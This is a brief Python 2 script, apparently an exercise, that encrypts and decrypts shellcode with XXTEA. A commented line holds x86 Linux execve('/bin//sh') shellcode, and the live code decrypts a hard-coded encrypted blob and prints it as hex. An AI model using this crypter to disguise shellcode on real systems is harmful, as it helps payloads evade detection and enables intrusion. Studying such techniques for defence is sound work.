import random, string
import xxtea
from sys import stdin, stdout

#k=''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16))

#print k
#key = "fooofooofooofooo"

#s = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
#enc = xxtea.encrypt(s, k)


#stdout.write("\\x")
#stdout.flush()
#print '\\x'.join(map("%2.2x".__mod__, map(ord, enc)))


#print d.encode('hex')
d="\x1e\xdf\x0e\x08\x81\x08\xe2\xbf\x4d\xce\xf1\xd5\x90\xcd\xd8\x71\xe4\x2e\x69\x30\x98\x38\xec\xfb\x64\xd3\x00\x54\x5d\x53\x60\xc8\xf0\xdf\x4b\xf7\xf5\xbb\xaf\xa2\x35\xe1\xc8\xe2\x50\x9c\xfd\x7f"

back = xxtea.decrypt(d, "codiceinsicuro11")
print back.encode("hex")

#stdout.write("\\x")
#stdout.flush()
#print '\\x'.join(map("%2.2x".__mod__, map(ord, back)))
